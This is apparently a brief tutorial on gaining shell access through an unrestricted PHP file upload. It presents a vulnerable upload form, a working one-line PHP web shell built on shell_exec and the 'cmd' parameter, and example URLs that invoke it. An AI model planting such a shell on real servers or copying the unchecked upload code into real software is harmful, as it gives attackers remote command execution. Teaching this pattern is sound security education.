
**popping a shell** 
The phrase popping a shell describes the outcome of any attack whereby a hacker gains local or remote access to a system’s shell, then sends execution instructions to it.

**Cheat Sheet**
https://github.com/nicholasaleks/webshells/tree/master

---

```php
<html>
<head>
<title>File Upload Form</title>
</head>
	<body>
		<form 
		action="" 
		method="POST" 
		enctype="multipart/form-data">
		<h2>Upload File</h2>
		<input type="file" name="uploaded_file">
		<input type="submit" name="submit" value="Upload">
		</form>
	</body>
</html>

<?php
	if($_SERVER["REQUEST_METHOD"] == "POST"){
		$filename = $_FILES["uploaded_file"]["name"];
		move_uploaded_file(
			$_FILES["uploaded_file"]["tmp_name"], 
			"uploads/" . $filename
		);
		echo "Your file was uploaded successfully.";
	}
?>
```

To exploit this code, an attacker might upload a file containing a PHP:
Hypertext Preprocessor (PHP) web shell payload, typically with a ​`.php`
extension.

The web shell code would provide the attacker with a command execution interface on the target system. 

Here is a simplified example of such a web shell payload:
```php
<?php
	$output = shell_exec($_GET['cmd']);
	echo $output;
?>
```
`shell_exec()` function allows a web application to execute shell
commands from within a PHP script.

When `shell_exec()` is called with a command as its parameter, it executes that command in the system shell and returns the output as a string with the same user as the application’s context (commonly `www-data`, `apache`, or `nginx`).

The payload will execute commands sent to it via the `cmd` parameter in an HTTP GET request.

# Example:

If the PHP web shell’s filename were `webshell​.php`, the attacker could access it in a web browser by visiting the following URL:
`http://target​-site​.com​/​uploads​/webshell​.php`. 

The PHP code in the web shell might then execute on the server, providing the attacker with an interface to execute commands on the system.

Using the `cmd` URL query parameter, the attacker could, for example, list files on the server with `ls`: 
`http://target​-site​.com​/uploads​/webshell​.php​?cmd​=ls`.

